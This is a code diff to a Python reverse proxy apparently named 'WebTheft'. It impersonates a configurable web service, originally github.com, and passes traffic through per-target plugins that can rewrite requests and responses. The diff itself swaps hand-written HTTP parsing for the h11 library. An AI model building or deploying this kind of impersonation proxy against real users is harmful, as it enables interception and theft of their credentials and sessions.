@@ -4,14 +4,15 @@ import ssl
 import sys
 import threading
 import uuid
+from dataclasses import dataclass
 from pathlib import Path
 from typing import Callable
 
-import utils.http_parser as http_parser
+import h11
 
-TARGET_HOST = "github.com"
-TARGET_PORT = 443
-TARGET_SSL = True
+target_host: str
+target_port: int
+target_ssl: bool
 
 stop: bool = False
 stop_route: str
@@ -19,15 +20,26 @@ stop_route: str
 created_sockets: list[socket.socket] = []
 created_threads: list[threading.Thread] = []
 
+
+# HTTP Request and response data class defnitions
+@dataclass
+class HttpRequest:
+    method: bytes
+    target: bytes
+    headers: list[tuple[bytes, bytes]]
+    body: bytes
+
+
+@dataclass
+class HttpResponse:
+    status_code: int
+    headers: list[tuple[bytes, bytes]]
+    body: bytes
+
+
 # Define plugin functions
-modify_request: Callable[
-    [dict[str, str], dict[str, list[str]], bytes],
-    tuple[dict[str, str], dict[str, list[str]], bytes],
-]
-modify_response: Callable[
-    [dict[str, str], dict[str, list[str]], bytes],
-    tuple[dict[str, str], dict[str, list[str]], bytes],
-]
+modify_request: Callable[[HttpRequest], HttpRequest]
+modify_response: Callable[[HttpResponse], HttpResponse]
 
 
 # Function to load the plugin file for the target
@@ -36,7 +48,7 @@ def load_plugin() -> None:
 
     executable_path: Path = Path(sys.argv[0]).parent
     plugin_path: str = str(
-        executable_path / "plugins" / ("%s.%d.py" % (TARGET_HOST, TARGET_PORT))
+        executable_path / "plugins" / ("%s.%d.py" % (target_host, target_port))
     )
     print("[proxy.py:load_plugin] Loading plugin file %s" % (plugin_path))  # Log
     plugin_spec = importlib.util.spec_from_file_location("plugin", plugin_path)
@@ -66,139 +78,155 @@ def handle_http(
     client_socket: socket.socket, server_socket: socket.socket | ssl.SSLSocket
 ) -> None:
     global modify_request, modify_response, stop_route, stop
-    keep_alive: bool = True
 
     # Send and receive loop
-    while keep_alive:
-        keep_alive = False
+    while True:
+        # recreate connections per cycle (fixes h11 state bug)
+        client_http = h11.Connection(h11.SERVER)
+        server_http = h11.Connection(h11.CLIENT)
 
-        # Receive from client
-        request_headers: dict[str, list[str]]
-        request_parameters: dict[str, str]
-        request_header_data: bytes = b""
-        request_body: bytes = b""
-        while not request_header_data.endswith(b"\r\n\r\n"):
-            request_header_data += client_socket.recv(1)
+        # Get client request
+        client_request = HttpRequest(b"", b"", [], b"")
+        client_raw_data: bytes
 
-        request_parameters = http_parser.get_request_parameters(request_header_data)
+        request_done = False
 
-        # Check if the proxy should be terminated
-        if request_parameters["route"] == stop_route:
-            print("[proxy.py:handle_http] Stopping the WebTheft proxy")  # Log
+        while not request_done:
+            # Get client request initial data
+            client_raw_data = client_socket.recv(4096)
+            if not client_raw_data:
+                client_socket.close()
+                server_socket.close()
+                return
+
+            client_http.receive_data(client_raw_data)
+
+            # Receive request
+            while True:
+                client_event = client_http.next_event()
+
+                if client_event is h11.NEED_DATA:
+                    break
+                if isinstance(client_event, h11.Request):
+                    client_request.method = client_event.method
+                    client_request.target = client_event.target
+                    client_request.headers = list(client_event.headers)
+                elif isinstance(client_event, h11.Data):
+                    client_request.body += client_event.data
+                elif isinstance(client_event, h11.EndOfMessage):
+                    request_done = True
+                    break
+
+        # Check if route matches the stop route
+        if client_request.target.decode() == stop_route:
+            client_socket.close()
+            server_socket.close()
             stop = True
-            continue
+            return
 
-        request_headers = http_parser.get_headers(request_header_data)
+        # Modify request data
+        modified_client_request = modify_request(client_request)
+
+        # Build modified request
+        modified_raw_request: bytes = b""
+        _request_builder = h11.Connection(h11.CLIENT)
+
+        _modified_request = h11.Request(
+            method=modified_client_request.method,
+            target=modified_client_request.target,
+            headers=modified_client_request.headers,
+        )
+
+        modified_raw_request += _request_builder.send(_modified_request)
+        modified_raw_request += _request_builder.send(
+            h11.Data(data=modified_client_request.body)
+        )
+        modified_raw_request += _request_builder.send(h11.EndOfMessage())
+
+        # Send modifed request to server
+        server_socket.sendall(modified_raw_request)
+
+        # Get server response
+        server_response = HttpResponse(0, [], b"")
+        server_raw_data: bytes
+
+        response_done = False
+
+        while not response_done:
+            # Get server response initial data
+            server_raw_data = server_socket.recv(4096)
+            if not server_raw_data:
+                client_socket.close()
+                server_socket.close()
+                return
+
+            server_http.receive_data(server_raw_data)
+
+            # Receive response
+            while True:
+                server_event = server_http.next_event()
+
+                if server_event is h11.NEED_DATA:
+                    break
+                if isinstance(server_event, h11.Response):
+                    server_response.status_code = server_event.status_code
+                    server_response.headers = list(server_event.headers)
+                elif isinstance(server_event, h11.Data):
+                    server_response.body += server_event.data
+                elif isinstance(server_event, h11.EndOfMessage):
+                    response_done = True
+                    break
+
+        # Modify response data
+        modified_server_response = modify_response(server_response)
+
+        # Build modified response
+        modified_raw_response: bytes = b""
+        _response_builder = h11.Connection(h11.SERVER)
+
+        _modified_response = h11.Response(
+            status_code=modified_server_response.status_code,
+            headers=modified_server_response.headers,
+        )
+
+        modified_raw_response += _response_builder.send(_modified_response)
+        modified_raw_response += _response_builder.send(
+            h11.Data(data=modified_server_response.body)
+        )
+        modified_raw_response += _response_builder.send(h11.EndOfMessage())
+
+        # Send modifed response to client
+        client_socket.sendall(modified_raw_response)
+
+        # Check if the connection should be closed
         if (
-            "content-length" in request_headers
-            and request_parameters["method"] != "HEAD"
+            b"connection: close" in modified_raw_response.split(b"\r\n\r\n")[0].lower()
+            or b"connection: close"
+            in modified_raw_request.split(b"\r\n\r\n")[0].lower()
         ):
-            request_content_length = int(request_headers["content-length"][0])
-            request_body += client_socket.recv(request_content_length)
-
-        # Modify client request with plugin functions
-        modified_request = modify_request(
-            request_parameters, request_headers, request_body
-        )
-        modified_request_parameters = modified_request[0]
-        modified_request_headers = modified_request[1]
-        modified_request_body = modified_request[2]
-
-        # Build modified client request
-        new_request = http_parser.build_request(
-            modified_request_parameters, modified_request_headers, modified_request_body
-        )
-
-        # Send to server
-        server_socket.sendall(new_request)
-
-        # Receive headers from server
-        response_headers: dict[str, list[str]]
-        response_parameters: dict[str, str]
-        response_header_data: bytes = b""
-        response_body: bytes = b""
-        while not response_header_data.endswith(b"\r\n\r\n"):
-            response_header_data += server_socket.recv(1)
-
-        # Receive body content from server
-        response_parameters = http_parser.get_response_parameters(response_header_data)
-        response_headers = http_parser.get_headers(response_header_data)
-
-        if "content-length" in response_headers:
-            response_content_length = int(response_headers["content-length"][0])
-            while not response_content_length == len(response_body):
-                response_body += server_socket.recv(1)
-        if "transfer-encoding" in response_headers:
-            if response_headers["transfer-encoding"][0].lower() == "chunked":
-                _finished = False
-                while not _finished:
-                    _chunk_size: int
-                    _chunk_data: bytes = b""
-                    _chunk_raw: bytes = b""
-
-                    while not _chunk_raw.endswith(b"\r\n"):
-                        _chunk_raw += server_socket.recv(1)
-
-                    _chunk_raw = _chunk_raw[:-2]
-                    _chunk_size = int(_chunk_raw.decode(), 16)
-                    if _chunk_size == 0:
-                        _finished = True
-                        continue
-
-                    while not len(_chunk_data) == _chunk_size:
-                        _chunk_data += server_socket.recv(1)
-                    server_socket.recv(2)
-                    response_body += _chunk_data
-            del response_headers["transfer-encoding"]
-            response_headers["content-length"] = []
-            response_headers["content-length"].append(str(len(response_body)))
-            server_socket.recv(2)
-
-        # Check if the connection should be kept alive
-        if "connection" in response_headers:
-            keep_alive = response_headers["connection"][0].lower() == "keep-alive"
-
-        # Modify server response with plugin functions
-        modified_response = modify_response(
-            response_parameters, response_headers, response_body
-        )
-        modified_response_parameters = modified_response[0]
-        modified_response_headers = modified_response[1]
-        modified_response_body = modified_response[2]
-
-        # Build modified server reponse
-        new_response = http_parser.build_response(
-            modified_response_parameters,
-            modified_response_headers,
-            modified_response_body,
-        )
-
-        # Send to client
-        client_socket.sendall(new_response)
-
-    client_socket.close()
-    server_socket.close()
-    # print("Closing connection")  # Debug
+            client_socket.close()
+            server_socket.close()
+            return
 
 
 # Function to handle the client connection
 def handle_client(
     client_socket: socket.socket, client_address: tuple[str, int]
 ) -> None:
-    global TARGET_HOST, TARGET_PORT, TARGET_SSL, created_sockets
+    global target_host, target_port, target_ssl, created_sockets
 
     print(
         "[proxy.py:handle_client] New client connected -> %s:%d"
         % (client_address[0], client_address[1])
     )  # Log
 
-    plain_socket: socket.socket = socket.create_connection((TARGET_HOST, TARGET_PORT))
+    plain_socket: socket.socket = socket.create_connection((target_host, target_port))
     target_socket = socket.socket | ssl.SSLSocket
 
     # Handle if the target uses SSL
-    if TARGET_SSL:
+    if target_ssl:
         context: ssl.SSLContext = ssl.create_default_context()
-        target_socket = context.wrap_socket(plain_socket, server_hostname=TARGET_HOST)
+        target_socket = context.wrap_socket(plain_socket, server_hostname=target_host)
     else:
         target_socket = plain_socket
 
@@ -242,8 +270,16 @@ def create_listening_socket(address: tuple[str, int], ssl: bool = False) -> None
 
 
 # Function to start the proxy
-def start(bind_data: tuple[str, int]) -> None:
-    global stop_route
+def start(bind_data: tuple[str, int], target_data: tuple[str, int, bool]) -> None:
+    global target_host, target_port, target_ssl, stop_route
+
+    target_host = target_data[0]
+    target_port = target_data[1]
+    target_ssl = target_data[2]
+    print(
+        "[proxy.py:start] Impersonating web service %s:%d (SSL: %r)" % target_data
+    )  # Log
+
     load_plugin()
 
     stop_route = "/" + str(uuid.uuid4())
